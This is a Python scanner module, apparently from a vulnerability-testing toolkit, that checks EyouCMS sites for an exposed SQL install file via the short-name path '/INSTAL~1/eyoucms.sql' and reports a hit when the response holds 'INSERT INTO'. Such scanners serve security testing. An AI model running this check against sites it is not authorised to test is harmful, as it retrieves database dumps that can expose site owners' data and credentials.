#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import urllib3
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class EyouCMS_SQLFILEREAD_Scan:
    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip("/ ")
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        timeout = target["timeout"]
        headers, self.proxy = ReqSet(header=header,proxy=proxy)
        if not self.batch:
            OutPrintInfo("EyouCMS", "开始检测EyouCMS SQLFILE READ...")
        url = baseurl + '/INSTAL~1/eyoucms.sql'

        try:
            resp2 = requests.get(url,verify=self.ssl,proxies=self.proxy,headers=headers,timeout=timeout)
            if "INSERT INTO" in resp2.text:
                OutPrintInfoSuc("EyouCMS",f"目标存在EyouCMS SQLFILE READ漏洞: {url}")
                if self.batch:
                    OutPutFile("eyoucms_sqlfile_read.txt",f"目标存在EyouCMS SQLFILE READ漏洞: {url}")
            else:
                if not self.batch:
                    OutPrintInfo("EyouCMS", "目标不存在EyouCMS SQLFILE READ漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("EyouCMS","目标请求出错")
        if not self.batch:
            OutPrintInfo("EyouCMS","EyouCMS SQLFILE READ检测结束")